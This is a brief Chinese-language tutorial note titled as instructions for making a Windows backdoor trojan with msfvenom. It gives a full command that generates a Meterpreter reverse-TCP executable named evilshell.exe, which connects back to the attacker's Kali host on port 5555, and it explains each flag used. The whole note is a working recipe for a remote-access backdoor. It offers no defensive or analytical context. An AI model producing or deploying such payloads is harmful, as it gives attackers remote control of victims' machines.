# msfvenom制作windows后门木马

```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=kali的ip lport=5555 -f exe >/root/evilshell.exe 
```

```
-p 参数后跟上payload（载体），攻击成功之后，要做什么事情 

lhost  后跟监听的IP 

lport  后跟监听的端口

-f  后跟要生成后门文件的类型
```

